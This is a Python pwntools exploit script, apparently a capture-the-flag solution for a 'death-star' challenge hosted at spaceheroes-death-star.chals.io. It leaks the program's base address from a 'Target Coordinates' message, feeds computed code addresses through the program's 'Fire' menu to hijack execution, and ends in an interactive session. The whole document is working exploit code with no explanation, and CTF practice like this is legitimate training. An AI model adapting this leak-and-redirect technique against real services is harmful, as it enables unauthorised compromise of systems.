#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io = remote("spaceheroes-death-star.chals.io", 443, ssl=True, sni="spaceheroes-death-star.chals.io")
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

#  debugPID()

ru(b"3: Fire\n")
sl(b'1')
sl(b'1')
sl(b'2')

ru(b"Target Coordinates => ")
elf_base = int(ru(b"\n", "drop")) - 0x1355
lg("elf_base")

debugPID()

ru(b"3: Fire\n")
sl(i2b(1))
ru(b"7. BESPIN\n")
sl(i2b(elf_base + 0x151F))
ru(b"3: Fire\n")
sl(i2b(3))
ru(b"3: Fire\n")
sl(i2b(1))
ru(b"7. BESPIN\n")
sl(i2b(elf_base + 0x1527))
ru(b"3: Fire\n")
sl(i2b(3))
ru(b"3: Fire\n")
sl(i2b(1))
ru(b"7. BESPIN\n")
sl(i2b(elf_base + 0x152F))
ru(b"3: Fire\n")
sl(i2b(3))

ru(b"3: Fire\n")
sl(i2b(1))
ru(b"7. BESPIN\n")
sl(i2b(elf_base + 0x153A))
ru(b"3: Fire\n")
sl(i2b(3))


ia()
